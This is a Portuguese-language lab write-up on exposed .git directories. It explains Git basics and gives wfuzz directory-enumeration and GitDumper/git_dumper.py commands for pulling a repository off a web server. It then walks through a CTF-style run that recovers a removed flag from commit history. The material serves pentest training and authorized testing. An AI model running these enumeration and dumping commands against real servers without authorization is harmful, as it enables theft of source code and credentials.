[[1 - LABS - Git Exposed]]
## **Git Exposed — Entendendo e Explorando Repositórios Git Expostos**

### O QUE É O GIT?

O **Git** é um sistema de **controle de versão** distribuído. Ele permite que vários desenvolvedores trabalhem no mesmo projeto, registrando alterações no código com histórico, autoria, e comentários.

### COMO FUNCIONA?

O Git armazena versões de arquivos em um repositório, incluindo todo o histórico de alterações. Isso facilita:

- Reverter mudanças
    
- Saber quem alterou o quê e quando
    
- Trabalhar em equipe com ramificações (branches)
    
- Rastrear falhas e bugs com mais precisão
    

---

## **O QUE É UMA BRANCH?**

Uma **branch** (ramificação) é uma linha separada de desenvolvimento dentro do Git. Serve para dividir o trabalho em diferentes funcionalidades ou correções, sem interferir no código principal.

Exemplo:

- `main` → Código em produção
    
- `dev` → Ambiente de desenvolvimento
    
- `feature/login` → Funcionalidade específica (ex: tela de login)
    

---

## **COMANDOS BÁSICOS DO GIT (FLUXO DE USO)**

```bash
git init                # Inicializa um repositório Git na pasta atual
git add arquivo.txt     # Adiciona um arquivo para ser versionado
git commit -m "mensagem" # Salva as alterações com uma mensagem
git log                 # Mostra o histórico de commits
git show <commit_id>    # Mostra detalhes (alterações) de um commit específico
```

- Os commits registram alterações com um hash único (ex: `f3a2c8b`).
    
- Você consegue ver **o que foi alterado**, **por quem**, e **quando**.
    
- Isso é essencial para auditoria e rastreabilidade em projetos.
    

---

## **RISCO: GIT EXPOSTO EM SERVIDORES**

O problema começa quando **desenvolvedores fazem upload da pasta `.git` para o servidor**. Essa pasta nunca deveria estar acessível publicamente.

Se acessível, ela contém:

- Todo o histórico do código-fonte
    
- Informações sensíveis (chaves, senhas hardcoded, tokens)
    
- Nome de usuários
    
- Branches e objetos do repositório
    

---

## **COMO DETECTAR `.git` EXPOSURE?**

Você pode usar:

### 1. Ferramenta gráfica: **DotGit** (extensão do navegador)

- Verifica se a pasta `.git/` está pública
    

### 2. Ferramenta de linha de comando: **wfuzz**

```bash
wfuzz -c -z file,wordlist.txt --hc 404 http://alvo.com/FUZZ
```

Explicando:

- `-c`: saída colorida
    
- `-z file,wordlist.txt`: usa wordlist (com nomes como `.git`, `admin`, etc)
    
- `--hc 404`: ignora respostas 404 (não encontradas)
    
- `FUZZ`: parte que será substituída pelas palavras da wordlist
    

Se o `.git/` for encontrado com status `200 OK`, é bem provável que o repositório esteja **exposto**.

---

## **COMO EXPLORAR UM GIT EXPOSTO COM GITDUMPER**

### 1. Clonar o GitDumper

```bash
git clone https://github.com/internetwache/GitTools
cd GitTools/Dumper
chmod +x gitdumper.sh
sudo ln -s $(pwd)/gitdumper.sh /usr/local/bin/gitdumper
```

> Agora você pode usar o `gitdumper` de qualquer lugar do terminal.

---

### 2. Usar o GitDumper com exemplo real

```bash
gitdumper http://alvo.com/.git/ /tmp/gitdump
```

- O script baixa o conteúdo da pasta `.git`
    
- Ele reconstrói o repositório localmente
    

### 3. Após o dump:

```bash
cd /tmp/gitdump
git reset --hard
ls -la
```

Agora você tem acesso ao código-fonte completo, histórico de commits, e possivelmente informações sensíveis.

---

Repositórios Git expostos representam um **risco crítico**. Com ferramentas como `wfuzz`, `DotGit` e `GitDumper`, é possível identificar e explorar essas falhas. Sempre use essas técnicas em ambientes autorizados, como pentests legais ou CTFs.

---

### Análise do processo que você executou

**1. Acesso inicial pelo navegador**  
Você começou verificando o alvo diretamente pelo navegador, o que é uma boa prática para observar o comportamento padrão da aplicação.

**2. Enumeração de diretórios com Wfuzz**  
Na primeira tentativa, você usou:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://10.10.0.6/FUZZ
```

Percebeu que todos os retornos eram código 200, dificultando a identificação de diretórios válidos.

**3. Filtragem por tamanho da resposta**  
Você refinou a busca com o parâmetro `--hh` (hide by length), focando em respostas com conteúdo diferente de 264 bytes:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hh 264 http://10.10.0.6/FUZZ
```

Essa técnica é bastante eficaz quando o servidor retorna o mesmo tamanho para erros genéricos.

**4. Identificação do diretório .git exposto**  
Você encontrou o diretório `.git`, o que indica uma falha grave de segurança. Esse tipo de exposição pode permitir a reconstrução completa do repositório do site.

**5. Extração do repositório com git-dumper**  
Com o repositório identificado, você executou:

```bash
python3 git_dumper.py http://10.10.0.6/ lab.gitdumper
```

O script fez o download de todos os objetos Git.

**6. Análise do conteúdo localmente**  
Você acessou o diretório:

```bash
cd lab.gitdumper
```

E localizou um arquivo `index.php`, que foi visualizado com `nano`.

**7. Utilização do Git para investigação**  
Você rodou:

```bash
git log
```

E encontrou dois commits. O último commit tinha uma mensagem sugestiva: _"Removendo flag"_.

**8. Visualização da alteração com git show**  
Com o comando:

```bash
git show 7eb5abd9b86eae8e1cf2c808ebb3220286374337
```

Você identificou que a flag foi substituída por "[REDACTED]". Isso confirmou que uma informação sensível havia sido exposta e depois "removida", mas ainda rastreável pelo histórico Git.

---

### Observações técnicas adicionais

- A falha explorada aqui é conhecida como **exposição de repositório Git**, e pode permitir desde **exfiltração de credenciais** até **reconstrução de lógica de aplicação**.
    
- O uso do `git log` e `git show` em um repositório clonado localmente, mesmo que via `git-dumper`, é uma técnica clássica para recuperar dados sensíveis que foram "removidos", mas ainda estão no histórico.
    
- Essa exploração pode ser usada como prova de conceito em relatórios de pentest com um impacto classificado como **crítico**.
    
